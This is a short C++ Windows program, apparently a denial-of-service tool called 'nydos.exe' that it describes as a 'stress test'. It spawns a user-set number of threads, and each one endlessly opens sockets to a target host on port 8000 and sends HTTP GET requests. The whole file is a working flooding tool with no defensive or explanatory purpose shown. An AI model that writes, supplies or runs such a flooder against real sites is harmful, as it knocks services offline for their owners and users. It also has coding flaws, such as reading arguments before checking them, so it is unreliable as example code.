#include <iostream>
#include <string>
#include <thread>
#include <vector>
#include <stdio.h>
#include <WinSock2.h>

#pragma warning(disable : 4996)
#pragma comment(lib, "ws2_32.lib")

void hit(std::string url) {
    while (1) {
        WSADATA wsaData;
        SOCKET Socket;
        SOCKADDR_IN SockAddr;
        int lineCount = 0;
        int rowCount = 0;
        struct hostent* host;
        std::string get_http;


        get_http = "GET / HTTP/1.1\r\nHost: " + url + "\r\nConnection: keep-alive\r\n\r\n";

        if (WSAStartup(MAKEWORD(2, 2), &wsaData) != 0) {
            std::cout << "WSAStartup failed.\n";
            return;
        }

        Socket = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
        host = gethostbyname(url.c_str());
           
        
        
        SockAddr.sin_port = htons(8000);
        SockAddr.sin_family = AF_INET;
        SockAddr.sin_addr.s_addr = *((unsigned long*)host->h_addr);

        if (connect(Socket, (SOCKADDR*)(&SockAddr), sizeof(SockAddr)) != 0) {
            std::cout << "Connecting failed.\n";
            return;
        }
        send(Socket, get_http.c_str(), strlen(get_http.c_str()), 0);

        closesocket(Socket);
        WSACleanup();
    }
}

int main(int argc, char* argv[]) {
    std::string url = argv[1];
    int thread_c = stoi(static_cast<std::string>(argv[2]));
    if (url == " " || thread_c == NULL) {
        std::cout << "nydos.exe url threadcount";
    }
    std::cout << "Starting stress test on " << url << " with " << thread_c << " threads.";

    std::vector<std::thread> threads;

    for (int i = 0; i < thread_c; ++i) {
        threads.emplace_back(std::thread(hit, url));
    }

    while (TRUE);

    return 0;
}
